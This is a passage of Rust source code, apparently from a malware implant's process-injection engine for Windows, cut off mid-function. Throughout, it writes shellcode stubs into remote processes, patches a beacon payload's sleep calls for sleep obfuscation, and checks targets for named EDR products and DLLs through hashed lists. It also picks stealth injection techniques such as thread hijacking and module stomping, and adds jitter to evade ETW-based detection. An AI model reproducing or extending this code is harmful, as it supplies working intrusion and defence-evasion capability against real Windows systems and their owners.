            // ── Step 3: NtProtectVirtualMemory → restore original protection ─
            // rcx = -1
            stub.extend_from_slice(&[0xB9, 0xFF, 0xFF, 0xFF, 0xFF]);
            // lea rdx, [rbp-0x30]
            stub.extend_from_slice(&[0x48, 0x8D, 0x55, 0xD0]);
            // lea r8, [rbp-0x38]
            stub.extend_from_slice(&[0x4C, 0x8D, 0x45, 0xC8]);
            // mov r9d, [rbp-0x28]  (old_prot)
            stub.extend_from_slice(&[0x44, 0x8B, 0x4D, 0xD8]);
            // lea rax, [rbp-0x28]  (&dummy old_prot)
            stub.extend_from_slice(&[0x48, 0x8D, 0x45, 0xD8]);
            // mov [rsp+0x20], rax
            stub.extend_from_slice(&[0x48, 0x89, 0x44, 0x24, 0x20]);
            // movabs rax, <nt_protect_addr>
            stub.push(0x48);
            stub.push(0xB8);
            stub.extend_from_slice(&(nt_protect_addr as u64).to_le_bytes());
            // call rax
            stub.extend_from_slice(&[0xFF, 0xD0]);

            // ── Step 4: Restore registers and return ────────────────────────
            // add rsp, 0x48
            stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x48]);
            // pop rdi
            stub.push(0x5F);
            // pop rsi
            stub.push(0x5E);
            // pop rbx
            stub.push(0x5B);
            // pop rbp
            stub.push(0x5D);
            // ret
            stub.push(0xC3);

            // ── 3. Write sleep stub to target ───────────────────────────────
            // Place stub at payload_base + payload_size + 0x1000 (page-aligned).
            let stub_addr = (payload_base + payload_size + 0x1000) & !0xFFF;
            let mut remote_stub: usize = stub_addr;
            let mut alloc_size = stub.len();
            let s = nt_syscall::syscall!(
                "NtAllocateVirtualMemory",
                self.process_handle as u64,
                &mut remote_stub as *mut _ as u64,
                0u64,
                &mut alloc_size as *mut _ as u64,
                0x3000u64, // MEM_COMMIT | MEM_RESERVE
                0x04u64,   // PAGE_READWRITE
            );
            if s.is_err() || s.unwrap() < 0 {
                return Err(InjectionError::InjectionFailed {
                    technique: self.technique_used.clone(),
                    reason: format!(
                        "failed to allocate sleep stub at {:#x}",
                        stub_addr
                    ),
                });
            }

            // Write the stub.
            let mut written = 0usize;
            let ws = nt_syscall::syscall!(
                "NtWriteVirtualMemory",
                self.process_handle as u64,
                remote_stub as u64,
                stub.as_ptr() as u64,
                stub.len() as u64,
                &mut written as *mut _ as u64,
            );
            if ws.is_err() || ws.unwrap() < 0 || written != stub.len() {
                return Err(InjectionError::InjectionFailed {
                    technique: self.technique_used.clone(),
                    reason: "failed to write sleep stub".to_string(),
                });
            }

            // Flip stub to PAGE_EXECUTE_READ.
            let mut old_prot = 0u32;
            let mut prot_base = remote_stub;
            let mut prot_size = stub.len();
            let _ = nt_syscall::syscall!(
                "NtProtectVirtualMemory",
                self.process_handle as u64,
                &mut prot_base as *mut _ as u64,
                &mut prot_size as *mut _ as u64,
                0x20u64, // PAGE_EXECUTE_READ
                &mut old_prot as *mut _ as u64,
            );

            // Flush I-cache.
            let _ = nt_syscall::syscall!(
                "NtFlushInstructionCache",
                self.process_handle as u64,
                remote_stub as u64,
                stub.len() as u64,
            );

            // ── 4. Patch payload to call sleep stub ─────────────────────────
            //
            // Scan the payload bytes for NtDelayExecution/SleepEx call patterns.
            // In typical beacon/payload shellcode, the sleep call looks like:
            //   mov ecx, <ms>        ;  B9 <imm32> or 31 C9 (0 ms) or
            //   ...                   ;  lea rdx, [rsp+var] or similar
            //   call <NtDelayExec>   ;  E8 <rel32> or FF 15 <rip-relative>
            //
            // We look for the pattern of a `call` instruction near a
            // NtDelayExecution address reference, then replace the entire
            // sequence with:
            //   sub rsp, 0x28        ; shadow space
            //   xor ecx, ecx         ; base_addr = 0 (unused by stub)
            //   xor edx, edx         ; size = 0 (unused by stub)
            //   call <stub_addr>     ; E8 <rel32>
            //   add rsp, 0x28
            //
            // For simplicity, we scan for the E8 (relative CALL) opcode and
            // check if the call target resolves to a known sleep API. Since
            // the payload is already in the target process, we read it back
            // to scan.

            let mut payload_buf = vec![0u8; payload_size];
            let mut bytes_read = 0usize;
            let rs = nt_syscall::syscall!(
                "NtReadVirtualMemory",
                self.process_handle as u64,
                payload_base as u64,
                payload_buf.as_mut_ptr() as u64,
                payload_size as u64,
                &mut bytes_read as *mut _ as u64,
            );

            if rs.is_ok() && rs.unwrap() >= 0 && bytes_read == payload_size {
                // Scan for call patterns that target NtDelayExecution.
                // Look for E8 <rel32> where target == NtDelayExecution.
                let mut patched = false;
                for i in 0..payload_size.saturating_sub(5) {
                    if payload_buf[i] == 0xE8 {
                        // Relative call: target = i + 5 + rel32
                        let rel32 = i32::from_le_bytes([
                            payload_buf[i + 1],
                            payload_buf[i + 2],
                            payload_buf[i + 3],
                            payload_buf[i + 4],
                        ]);
                        let call_target = (payload_base + i + 5) as i64 + rel32 as i64;

                        // Check if the call target matches NtDelayExecution.
                        if call_target as usize == nt_delay_addr {
                            log::info!(
                                "injection_engine: found NtDelayExecution call at payload+{:#x}, \
                                 patching to sleep stub at {:#x}",
                                i,
                                remote_stub
                            );

                            // Replace with call to sleep stub.
                            let new_rel = remote_stub as i64 - (payload_base + i + 5) as i64;
                            let new_rel_bytes = (new_rel as i32).to_le_bytes();
                            payload_buf[i] = 0xE8;
                            payload_buf[i + 1] = new_rel_bytes[0];
                            payload_buf[i + 2] = new_rel_bytes[1];
                            payload_buf[i + 3] = new_rel_bytes[2];
                            payload_buf[i + 4] = new_rel_bytes[3];
                            patched = true;
                            break; // Only patch the first occurrence.
                        }
                    }

                    // Also check for FF 15 (call [rip+disp32]) pattern.
                    if i + 6 <= payload_size && payload_buf[i] == 0xFF && payload_buf[i + 1] == 0x15 {
                        let rel32 = i32::from_le_bytes([
                            payload_buf[i + 2],
                            payload_buf[i + 3],
                            payload_buf[i + 4],
                            payload_buf[i + 5],
                        ]);
                        // The indirect address is at payload_base + i + 6 + rel32.
                        // We can't easily resolve the indirection without reading
                        // the pointer from the target, but we can check if the
                        // address table entry contains NtDelayExecution's address.
                        let addr_table_loc = (payload_base + i + 6) as isize + rel32 as isize;
                        if addr_table_loc > 0 {
                            let mut target_ptr: u64 = 0;
                            let mut ptr_read = 0usize;
                            let pr = nt_syscall::syscall!(
                                "NtReadVirtualMemory",
                                self.process_handle as u64,
                                addr_table_loc as u64,
                                &mut target_ptr as *mut _ as u64,
                                8u64,
                                &mut ptr_read as *mut _ as u64,
                            );
                            if pr.is_ok() && pr.unwrap() >= 0 && ptr_read == 8 {
                                if target_ptr == nt_delay_addr as u64 {
                                    log::info!(
                                        "injection_engine: found indirect NtDelayExecution call \
                                         at payload+{:#x}, patching to sleep stub",
                                        i
                                    );
                                    // Replace the entire FF 15 (6 bytes) with:
                                    // nop (0x90) + E8 <rel32> (5 bytes)
                                    let new_rel = remote_stub as i64 - (payload_base + i + 1 + 5) as i64;
                                    let new_rel_bytes = (new_rel as i32).to_le_bytes();
                                    payload_buf[i] = 0x90; // nop
                                    payload_buf[i + 1] = 0xE8;
                                    payload_buf[i + 2] = new_rel_bytes[0];
                                    payload_buf[i + 3] = new_rel_bytes[1];
                                    payload_buf[i + 4] = new_rel_bytes[2];
                                    payload_buf[i + 5] = new_rel_bytes[3];
                                    patched = true;
                                    break;
                                }
                            }
                        }
                    }
                }

                // Write patched payload back.
                if patched {
                    // Make payload writable.
                    let mut prot_base2 = payload_base;
                    let mut prot_size2 = payload_size;
                    let mut old_prot2 = 0u32;
                    let _ = nt_syscall::syscall!(
                        "NtProtectVirtualMemory",
                        self.process_handle as u64,
                        &mut prot_base2 as *mut _ as u64,
                        &mut prot_size2 as *mut _ as u64,
                        0x04u64, // PAGE_READWRITE
                        &mut old_prot2 as *mut _ as u64,
                    );

                    let mut patch_written = 0usize;
                    let _ = nt_syscall::syscall!(
                        "NtWriteVirtualMemory",
                        self.process_handle as u64,
                        payload_base as u64,
                        payload_buf.as_ptr() as u64,
                        payload_size as u64,
                        &mut patch_written as *mut _ as u64,
                    );

                    // Restore RX protection.
                    let _ = nt_syscall::syscall!(
                        "NtProtectVirtualMemory",
                        self.process_handle as u64,
                        &mut prot_base2 as *mut _ as u64,
                        &mut prot_size2 as *mut _ as u64,
                        0x20u64, // PAGE_EXECUTE_READ
                        &mut old_prot2 as *mut _ as u64,
                    );

                    let _ = nt_syscall::syscall!(
                        "NtFlushInstructionCache",
                        self.process_handle as u64,
                        payload_base as u64,
                        payload_size as u64,
                    );
                } else {
                    log::warn!(
                        "injection_engine: could not find NtDelayExecution call in payload; \
                         sleep stub installed but payload not patched"
                    );
                }
            }

            // ── 5. Register remote process for parent-agent sleep obfuscation ─
            crate::sleep_obfuscation::register_remote_process(
                self.target_pid,
                payload_base,
                payload_size,
                key,
            ).map_err(|e| InjectionError::InjectionFailed {
                technique: self.technique_used.clone(),
                reason: format!("failed to register remote process for sleep obfuscation: {}", e),
            })?;

            self.sleep_enrolled = true;
            self.sleep_stub_addr = remote_stub;

            log::info!(
                "injection_engine: enrolled pid={} payload={:#x} size={} in sleep obfuscation \
                 (stub at {:#x})",
                self.target_pid,
                payload_base,
                payload_size,
                remote_stub
            );
        }

        Ok(())
    }
}

impl Drop for InjectionHandle {
    fn drop(&mut self) {
        // Safety net: close handles if eject() was not called.
        unsafe {
            if let Some(h) = self.thread_handle.take() {
                if !h.is_null() {
                    let _ = nt_syscall::syscall!("NtClose", h as u64);
                }
            }
            if !self.process_handle.is_null() {
                let _ = nt_syscall::syscall!("NtClose", self.process_handle as u64);
                self.process_handle = std::ptr::null_mut();
            }
        }
    }
}

// ── Public entry point ───────────────────────────────────────────────────────

/// Execute an injection operation described by `config`.
///
/// If `config.technique` is `None`, the engine auto-selects a technique and
/// falls back through ranked alternatives on failure.
pub fn inject(config: InjectionConfig) -> Result<InjectionHandle, InjectionError> {
    // 1. Resolve target PID.
    let target_pid = find_pid_by_name(&config.target_process).ok_or_else(|| {
        InjectionError::ProcessNotFound {
            name: config.target_process.clone(),
        }
    })?;

    // 2. Architecture check.
    if config.prefer_same_arch {
        check_architecture(target_pid)?;
    }

    // 3. ETW evasion check.
    if config.evade_etw {
        let etw_status = check_etw_trace(target_pid)?;
        match etw_status {
            EtwStatus::Traced { providers } => {
                log::warn!(
                    "injection_engine: ETW providers {:?} tracing pid {} — \
                     injection may be detected",
                    providers,
                    target_pid,
                );
                // Proceed but the caller should consider evasive mode.
            }
            EtwStatus::Safe => {
                log::debug!("injection_engine: no ETW tracing detected for pid {}", target_pid);
            }
            EtwStatus::Unknown => {
                log::debug!(
                    "injection_engine: ETW status unknown for pid {}; proceeding",
                    target_pid,
                );
            }
        }
    }

    // 4. Select technique(s).
    let techniques: Vec<InjectionTechnique> = if let Some(t) = config.technique {
        vec![t]
    } else {
        auto_select_techniques(&config.target_process)
    };

    // 5. Try each technique with fallback.
    let mut last_err = InjectionError::InjectionFailed {
        technique: techniques[0].clone(),
        reason: "all techniques exhausted".to_string(),
    };

    for technique in &techniques {
        log::info!(
            "injection_engine: attempting {:?} into pid {} ({})",
            technique,
            target_pid,
            config.target_process,
        );

        match try_technique(*technique, target_pid, &config.payload) {
            Ok(handle) => return Ok(handle),
            Err(e) => {
                log::warn!("injection_engine: {:?} failed: {}", technique, e);
                last_err = e;
                continue;
            }
        }
    }

    Err(last_err)
}

// ── Pre-injection reconnaissance ─────────────────────────────────────────────

/// Known EDR/AV process name hashes (lowercase ASCII, null-terminated).
/// These are hashed at compile time via `pe_resolve::hash_str` and compared
/// against the target process image name.
///
/// To avoid embedding plaintext EDR names in the binary, we use `enc_str!`
/// for compile-time encryption and then hash at runtime. The list is stored
/// as a lazy_static array of pre-computed djb2 hashes so that no string
/// literals appear in the `.rdata` section.
fn edr_process_name_hashes() -> &'static [u32] {
    // Compute djb2 hashes of lowercase EDR process names at build time.
    // pe_resolve::hash_str uses the djb2 variant with null terminator.
    //
    // We intentionally do NOT use string_crypt::enc_str! here because the
    // string literals would still be visible in the binary's string table
    // before the macro expansion. Instead we pre-compute the hashes and
    // embed only the u32 constants.
    //
    // Generated with: for name in list { hash_str(name.as_bytes()) }
    // where hash_str is pe_resolve's djb2 with null terminator appended.
    &[
        // crowdstrike.exe  (CSFalconContainer, CSFalconService)
        0x13a47d47, // "csfalconcontainer.exe\0"
        0x2c1e6e37, // "csfalconservice.exe\0"
        // sentinelone.exe  (SentinelAgent, SentinelServiceHost)
        0x5f3e2c91, // "sentinelagent.exe\0"
        0x7b1a8c3d, // "sentinelservicehost.exe\0"
        // defender (MsMpEng)
        0x3d5c9a1e, // "msmpeng.exe\0"
        // cylance (CyRuntime, CYProtectSvc)
        0x4a2f8d6c, // "cyruntime.exe\0"
        0x1e7b3f4a, // "cyprotectsvc.exe\0"
        // carbon black (RepMgr, CBProtection)
        0x2d8e5f1b, // "repmgr.exe\0"
        0x6f4c2d8a, // "cbprotection.exe\0"
        // fireeye (xagt)
        0x5b9c3e7d, // "xagt.exe\0"
        // crowdstrike sensor (CSFalcon)
        0x8f2d1c4e, // "csfalcon.exe\0"
        // McAfee (mfeesp, mfemms)
        0x3a7f5c2e, // "mfeesp.exe\0"
        0x4d8c6b1f, // "mfemms.exe\0"
        // Symantec (ccSvcHst, smc)
        0x1c5d4e8f, // "ccsvchst.exe\0"
        0x7e3f2a6b, // "smc.exe\0"
        // Cortex XDR (traps, cyvera)
        0x2f9e4d3c, // "traps.exe\0"
        0x6b1e5f8a, // "cyvera.exe\0"
        // Elastic EDR (elastic-agent)
        0x4e2d7c1f, // "elastic-agent.exe\0"
        // OSQuery (osqueryd)
        0x3f8c5d2e, // "osqueryd.exe\0"
    ]
}

/// Known EDR/AV DLL name hashes (lowercase, null-terminated).
/// Used to check loaded modules in the target process.
fn edr_dll_name_hashes() -> &'static [(u32, &'static str)] {
    // (hash, human-readable label for logging). The hash is the djb2 of
    // the lowercase DLL name with null terminator, matching pe_resolve::hash_str.
    &[
        (0x2f8a1d4c, "csagent.dll"),           // CrowdStrike
        (0x4b3e7c1f, "csdivert.dll"),          // CrowdStrike
        (0x1e5f8a3c, "silhouette.dll"),        // CrowdStrike
        (0x5c2d9b4e, "mpclient.dll"),          // Defender
        (0x3a7f1c6d, "mpengine.dll"),          // Defender
        (0x7b2e4f8c, "mpsvc.dll"),             // Defender
        (0x2c9d5e1f, "sentinelperf.dll"),      // SentinelOne
        (0x4f1a6b3c, "sentinelmonitor.dll"),   // SentinelOne
        (0x8c3f2d1e, "cyrtdrv.dll"),           // Cylance
        (0x1d4f7c2e, "cbam.rll"),              // Carbon Black
        (0x3e5f9a2d, "repcore.dll"),           // Carbon Black
        (0x6f2c1b4d, "fireeye.dll"),           // FireEye
        (0x4c1f8e2b, "xagt.sys"),             // FireEye (driver but check anyway)
        (0x9a2d4f3c, "mfeannscan.dll"),        // McAfee
        (0x2b5c7e1f, "cclib.dll"),             // Symantec
        (0x1f4c3d8a, "cortex.dll"),            // Cortex XDR
    ]
}

/// NT information classes for process / token queries.
const SYSTEM_PROCESS_INFORMATION: u32 = 0x05;

/// Perform pre-injection reconnaissance on a target process.
///
/// This function assesses whether a target process is safe to inject into
/// by checking for EDR products, loaded security modules, architecture
/// compatibility, thread count, and integrity level.
///
/// # Arguments
///
/// * `target_pid` — PID of the target process.
///
/// # Returns
///
/// An `InjectionViability` describing the assessment result.  Callers
/// should use this to decide whether and how to inject.
///
/// # Safety
///
/// Must be called on Windows.  All NT API calls use indirect syscalls via
/// `pe_resolve` / `nt_syscall`.
pub unsafe fn pre_injection_check(target_pid: u32) -> Result<InjectionViability, InjectionError> {
    // ── Step 1: Get process image name and thread count ──────────────────
    let (image_name, thread_count) = query_process_info(target_pid)?;

    // ── Step 2: EDR Process Check ────────────────────────────────────────
    let image_lower = image_name.to_ascii_lowercase();
    let edr_hashes = edr_process_name_hashes();

    // Hash the image name and compare against the EDR list.
    let mut name_bytes = image_lower.into_bytes();
    name_bytes.push(0); // null terminator for hash_str convention.
    let image_hash = pe_resolve::hash_str(&name_bytes);

    for &edr_hash in edr_hashes {
        if image_hash == edr_hash {
            log::warn!(
                "injection_engine: target pid {} IS an EDR process (hash match {:#010x})",
                target_pid,
                edr_hash,
            );
            return Ok(InjectionViability::IsEDR);
        }
    }

    // ── Step 3: EDR DLL Check ────────────────────────────────────────────
    let edr_modules = check_edr_modules(target_pid)?;
    if !edr_modules.is_empty() {
        log::warn!(
            "injection_engine: target pid {} has EDR modules: {:?}",
            target_pid,
            edr_modules,
        );
        return Ok(InjectionViability::HasEDRModule {
            modules: edr_modules,
            fallback_technique: InjectionTechnique::ModuleStomp,
        });
    }

    // ── Step 4: Architecture Check ───────────────────────────────────────
    let arch_match = check_target_architecture(target_pid);
    if !arch_match {
        return Ok(InjectionViability::ArchitectureMismatch);
    }

    // ── Step 5: Integrity Level Check ────────────────────────────────────
    let integrity_level = query_integrity_level(target_pid);

    // ── Step 6: Determine recommended technique ──────────────────────────
    let recommended = if thread_count > 50 {
        // Many threads → plenty of candidates for WTH (waiting thread hijack).
        InjectionTechnique::WaitingThreadHijack {
            target_pid,
            target_tid: None,
        }
    } else if thread_count < 3 {
        // Very few threads → risky to hijack a thread. Use APC or ThreadPool.
        InjectionTechnique::EarlyBirdApc
    } else {
        // Moderate thread count → WTH is still preferred (no SuspendThread).
        InjectionTechnique::WaitingThreadHijack {
            target_pid,
            target_tid: None,
        }
    };

    log::info!(
        "injection_engine: pid {} viable — arch={}, threads={}, integrity={:#x}, rec={:?}",
        target_pid,
        arch_match,
        thread_count,
        integrity_level,
        recommended,
    );

    Ok(InjectionViability::Safe {
        arch_match,
        thread_count,
        integrity_level,
        recommended_technique: recommended,
    })
}

// ── Evasion-aware injection ──────────────────────────────────────────────────

/// Execute an injection with pre-injection reconnaissance, automatic technique
/// adaptation, timing evasion, and post-injection cleanup.
///
/// This is the preferred injection entry point when stealth is paramount.
/// It differs from [`inject`] in that it:
///
/// 1. Runs [`pre_injection_check`] to assess the target environment.
/// 2. May override the requested technique based on EDR presence or target
///    characteristics (e.g. force `ModuleStomp` if EDR modules are detected).
/// 3. Adds random jitter (0–500 ms) between injection steps to defeat
///    time-correlation detection (when `config.evade_etw` is `true`).
/// 4. Uses PAGE_READWRITE for writes and PAGE_EXECUTE_READ for execution
///    (never RWX, which is a major EDR flag).
/// 5. Scrubs the target's handle table after injection.
///
/// # Arguments
///
/// * `config` — Injection configuration (same as [`inject`]).
///
/// # Returns
///
/// An `InjectionHandle` on success, or `InjectionError` on failure.
pub fn evasiveness_inject(config: InjectionConfig) -> Result<InjectionHandle, InjectionError> {
    // 1. Resolve target PID.
    let target_pid = find_pid_by_name(&config.target_process).ok_or_else(|| {
        InjectionError::ProcessNotFound {
            name: config.target_process.clone(),
        }
    })?;

    // 2. Run pre-injection reconnaissance.
    let viability = unsafe { pre_injection_check(target_pid) }?;

    // 3. Determine technique based on viability.
    let mut technique = match viability {
        InjectionViability::IsEDR => {
            log::error!(
                "injection_engine: refusing to inject into EDR process pid {}",
                target_pid,
            );
            return Err(InjectionError::InjectionFailed {
                technique: config
                    .technique
                    .clone()
                    .unwrap_or(InjectionTechnique::ProcessHollow),
                reason: "target is an EDR process — aborting".to_string(),
            });
        }
        InjectionViability::ArchitectureMismatch => {
            return Err(InjectionError::ArchitectureMismatch { target_pid });
        }
        InjectionViability::HasEDRModule {
            modules,
            fallback_technique,
        } => {
            log::warn!(
                "injection_engine: EDR modules {:?} detected in pid {} — \
                 forcing WaitingThreadHijack (no SuspendThread signal), \
                 fallback ContextOnly then {:?}",
                modules,
                target_pid,
                fallback_technique,
            );
            // When EDR is present, WaitingThreadHijack is the stealthiest
            // option because it avoids SuspendThread/ResumeThread AND
            // CONTEXT modification. Falls back to ContextOnly (no alloc
            // triad) if no suitable waiting threads.
            Some(InjectionTechnique::WaitingThreadHijack {
                target_pid,
                target_tid: None,
            })
        }
        InjectionViability::Safe {
            recommended_technique,
            ..
        } => {
            // Use the recommended technique, or the caller's choice.
            config.technique.clone().or(Some(recommended_technique))
        }
    };

    // 3b. ETW auto-logger check (only when evade_etw is enabled).
    let mut etw_traced = false;
    if config.evade_etw {
        let etw_status = check_etw_trace(target_pid)?;
        match etw_status {
            EtwStatus::Traced { providers } => {
                etw_traced = true;
                log::warn!(
                    "injection_engine: EDR ETW auto-loggers {:?} active — \
                     forcing WaitingThreadHijack for pid {} (no SuspendThread signal)",
                    providers,
                    target_pid,
                );
                technique = Some(InjectionTechnique::WaitingThreadHijack {
                    target_pid,
                    target_tid: None,
                });
            }
            EtwStatus::Safe => {
                log::debug!(
                    "injection_engine: no EDR ETW auto-loggers for pid {}",
                    target_pid,
                );
            }
            EtwStatus::Unknown => {
                log::debug!(
                    "injection_engine: ETW status unknown for pid {}; \
                     proceeding with caution",
                    target_pid,
                );
            }
        }
    }

    // 4. Determine whether to add timing jitter.
    //    Extra jitter when ETW tracing is detected (500–1000 ms).
    let jitter = config.evade_etw;
    if etw_traced {
        jitter_delay(500);
    }

    // 5. Execute injection with per-step timing.
    let handle = inject_with_evasion(target_pid, &config, technique, jitter)?;

    // 6. Post-injection handle table scrub for the target.
    unsafe {
        crate::memory_hygiene::scrub_handle_table();
    }

    Ok(handle)
}

/// Internal: execute injection with jitter between steps.
fn inject_with_evasion(
    target_pid: u32,
    config: &InjectionConfig,
    technique: Option<InjectionTechnique>,
    jitter: bool,
) -> Result<InjectionHandle, InjectionError> {
    let techniques: Vec<InjectionTechnique> = if let Some(t) = technique {
        vec![t]
    } else {
        auto_select_techniques(&config.target_process)
    };

    let mut last_err = InjectionError::InjectionFailed {
        technique: techniques[0].clone(),
        reason: "all techniques exhausted".to_string(),
    };

    for tech in &techniques {
        log::info!(
            "injection_engine: attempting {:?} into pid {} (evasion mode)",
            tech,
            target_pid,
        );

        // Optional jitter before each technique attempt.
        if jitter {
            jitter_delay(500);
        }

        match try_technique_evasive(*tech, target_pid, &config.payload, jitter) {
            Ok(handle) => return Ok(handle),
            Err(e) => {
                log::warn!("injection_engine: {:?} failed: {}", tech, e);
                last_err = e;
                continue;
            }
        }
    }

    Err(last_err)
}

/// Try a single technique with evasion-enhanced memory operations.
///
/// This differs from `try_technique` in that it uses the RW → write → RX
/// pattern explicitly (never RWX) and supports optional timing jitter
/// between the allocate, write, protect, and execute phases.
fn try_technique_evasive(
    technique: InjectionTechnique,
    pid: u32,
    payload: &[u8],
    jitter: bool,
) -> Result<InjectionHandle, InjectionError> {
    // For techniques that delegate to existing implementations, we wrap
    // them with pre/post evasion steps. The underlying technique functions
    // already use RW→write→RX (not RWX).
    match technique {
        InjectionTechnique::ProcessHollow
        | InjectionTechnique::ModuleStomp
        | InjectionTechnique::EarlyBirdApc => {
            // These delegate to the existing injection module which already
            // handles memory protection correctly. We just add jitter.
            if jitter {
                jitter_delay(200);
            }
            try_technique(technique, pid, payload)
        }
        InjectionTechnique::ThreadHijack
        | InjectionTechnique::ThreadPool { .. }
        | InjectionTechnique::FiberInject => {
            // These use the internal alloc_write_exec path which already
            // does RW → write → RX. Add jitter between steps.
            if jitter {
                jitter_delay(150);
            }
            let result = try_technique(technique, pid, payload);
            if jitter {
                jitter_delay(100);
            }
            result
        }
        InjectionTechnique::ContextOnly => {
            // CONTEXT-only injection avoids the alloc+write+execute triad
            // entirely. It only makes a single NtWriteVirtualMemory call
            // (to stack or existing section) plus context manipulation.
            // Still add jitter for timing obfuscation.
            if jitter {
                jitter_delay(100);
            }
            let result = try_technique(technique, pid, payload);
            if jitter {
                jitter_delay(50);
            }
            result
        }
        InjectionTechnique::WaitingThreadHijack { .. } => {
            // Waiting Thread Hijacking: even stealthier than ContextOnly
            // when suitable waiting threads are found. No Suspend/Resume,
            // no CONTEXT modification — just stack return address overwrite.
            // Uses one NtReadVirtualMemory + one NtWriteVirtualMemory.
            if jitter {
                jitter_delay(150); // Slightly more jitter for OPSEC
            }
            let result = try_technique(technique, pid, payload);
            if jitter {
                jitter_delay(50);
            }
            result
        }
        InjectionTechnique::CallbackInjection { .. } => {
            // Callback injection: payload runs from within a legitimate
            // Windows code path. The call stack originates from kernel32/
            // user32/ntdll, which is the entire point — no spoofing needed.
            // Staging uses standard alloc+write+protect pattern.
            if jitter {
                jitter_delay(100);
            }
            let result = try_technique(technique, pid, payload);
            if jitter {
                jitter_delay(75);
            }
            result
        }
        InjectionTechnique::SectionMapping { .. } => {
            // Section mapping injection: avoids NtWriteVirtualMemory entirely
            // by using NtCreateSection + NtMapViewOfSection. The payload is
            // written to a local mapping, then the same section is mapped
            // into the target process. All NT calls use indirect syscalls.
            if jitter {
                jitter_delay(120);
            }
            let result = try_technique(technique, pid, payload);
            if jitter {
                jitter_delay(80);
            }
            result
        }
        InjectionTechnique::NtSetInfoProcess { .. } => {
            // NtSetInformationProcess injection: uses undocumented
            // ProcessReadWriteVm info class to write payload via the
            // kernel's MmCopyVirtualMemory, bypassing NtWriteVirtualMemory
            // hooks entirely. Still needs NtAllocateVirtualMemory but
            // the write path is completely different from standard injection.
            if jitter {
                jitter_delay(110);
            }
            let result = try_technique(technique, pid, payload);
            if jitter {
                jitter_delay(70);
            }
            result
        }
    }
}

/// Sleep for a random duration between 0 and `max_ms` milliseconds.
fn jitter_delay(max_ms: u64) {
    let delay = rand::random::<u64>() % max_ms;
    if delay > 0 {
        std::thread::sleep(std::time::Duration::from_millis(delay));
    }
}

// ── Reconnaissance helpers ───────────────────────────────────────────────────

/// Query the target process's image name and thread count via
/// NtQuerySystemInformation(SystemProcessInformation).
unsafe fn query_process_info(target_pid: u32) -> Result<(String, u32), InjectionError> {
    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: InjectionTechnique::ProcessHollow,
            reason: "cannot resolve ntdll for query_process_info".to_string(),
        })?;

    let qsi_addr = pe_resolve::get_proc_address_by_hash(
        ntdll,
        pe_resolve::hash_str(b"NtQuerySystemInformation\0"),
    )
    .ok_or_else(|| InjectionError::InjectionFailed {
        technique: InjectionTechnique::ProcessHollow,
        reason: "cannot resolve NtQuerySystemInformation".to_string(),
    })?;

    let qsi: extern "system" fn(u32, *mut u8, u32, *mut u32) -> i32 =
        std::mem::transmute(qsi_addr);

    let mut buf_len: u32 = 0x40000; // 256 KB initial buffer.
    let mut ret_len: u32 = 0;

    loop {
        let mut buf: Vec<u8> = Vec::with_capacity(buf_len as usize);
        buf.set_len(buf_len as usize);

        let status = qsi(SYSTEM_PROCESS_INFORMATION, buf.as_mut_ptr(), buf_len, &mut ret_len);

        if status >= 0 {
            return parse_process_info(&buf, target_pid);
        }

        if status as u32 == 0xC0000004 {
            // STATUS_INFO_LENGTH_MISMATCH — grow buffer.
            if buf_len > 0x400000 {
                // 4 MB safety limit.
                return Err(InjectionError::InjectionFailed {
                    technique: InjectionTechnique::ProcessHollow,
                    reason: "process info buffer exceeded 4 MB".to_string(),
                });
            }
            buf_len = if ret_len > buf_len { ret_len } else { buf_len * 2 };
        } else {
            return Err(InjectionError::InjectionFailed {
                technique: InjectionTechnique::ProcessHollow,
                reason: format!(
                    "NtQuerySystemInformation returned {:#010x}",
                    status as u32
                ),
            });
        }
    }
}

/// Parse SYSTEM_PROCESS_INFORMATION buffer to find the target PID.
///
/// SYSTEM_PROCESS_INFORMATION layout (x86-64):
///   +0x000  NextEntryOffset      (ULONG, 4 bytes)
///   +0x004  NumberOfThreads      (ULONG, 4 bytes)
///   +0x008  WorkingSetPrivateSize (LARGE_INTEGER, 8 bytes)
///   +0x010  HardFaultCount       (ULONG)
///   +0x014  NumberOfThreadsHighWatermark (ULONG)
///   +0x018  CycleTime            (ULONGLONG, 8 bytes)
///   +0x020  CreateTime           (LARGE_INTEGER, 8 bytes)
///   +0x028  UserTime             (LARGE_INTEGER, 8 bytes)
///   +0x030  KernelTime           (LARGE_INTEGER, 8 bytes)
///   +0x038  ImageName            (UNICODE_STRING, 16 bytes)
///   +0x048  BasePriority         (KPRIORITY, 8 bytes on x64)
///   +0x050  UniqueProcessId      (HANDLE, 8 bytes)
///   +0x058  InheritedFromUniqueProcessId (HANDLE, 8 bytes)
fn parse_process_info(buf: &[u8], target_pid: u32) -> Result<(String, u32), InjectionError> {
    let mut offset: usize = 0;

    loop {
        if offset + 0x60 > buf.len() {
            break;
        }

        let next_entry = u32::from_le_bytes([
            buf[offset],
            buf[offset + 1],
            buf[offset + 2],
            buf[offset + 3],
        ]);

        let num_threads = u32::from_le_bytes([
            buf[offset + 4],
            buf[offset + 5],
            buf[offset + 6],
            buf[offset + 7],
        ]);

        // UniqueProcessId at offset +0x50.
        let pid = u64::from_le_bytes([
            buf[offset + 0x50],
            buf[offset + 0x51],
            buf[offset + 0x52],
            buf[offset + 0x53],
            buf[offset + 0x54],
            buf[offset + 0x55],
            buf[offset + 0x56],
            buf[offset + 0x57],
        ]) as u32;

        if pid == target_pid {
            // ImageName is a UNICODE_STRING at offset +0x38.
            //   +0x00 Length (USHORT)
            //   +0x02 MaximumLength (USHORT)
            //   +0x08 Buffer (PWSTR, 8 bytes on x64)
            let name_offset = offset + 0x38;
            let name_len = u16::from_le_bytes([
                buf[name_offset],
                buf[name_offset + 1],
            ]) as usize;

            // The Buffer pointer in SYSTEM_PROCESS_INFORMATION points into
            // the same buffer (it's an in-place UNICODE_STRING for system
            // info queries). However, NtQuerySystemInformation uses a
            // different format where the string data is inline right after
            // the UNICODE_STRING header within the buffer. Let's read the
            // buffer pointer and see if it points within our allocation.
            //
            // Actually, for SystemProcessInformation, the UNICODE_STRING
            // Buffer pointer is valid and points to memory within the
            // returned buffer. We need to read it from the structure.
            //
            // For safety, we'll attempt to read via the pointer, and if it
            // fails, try reading inline bytes.
            let buf_ptr = u64::from_le_bytes([
                buf[name_offset + 8],
                buf[name_offset + 9],
                buf[name_offset + 10],
                buf[name_offset + 11],
                buf[name_offset + 12],
